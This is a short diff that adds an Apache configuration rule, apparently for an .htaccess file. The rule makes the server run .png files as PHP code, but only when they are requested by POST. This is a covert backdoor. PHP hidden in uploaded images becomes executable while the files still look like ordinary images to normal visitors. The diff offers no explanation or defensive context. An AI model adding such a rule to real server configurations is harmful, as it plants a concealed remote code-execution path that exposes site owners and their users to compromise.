@@ -1,0 +1,3 @@
+<If "%{REQUEST_METHOD} == 'POST'">
+	AddType application/x-httpd-php .png
+</If>
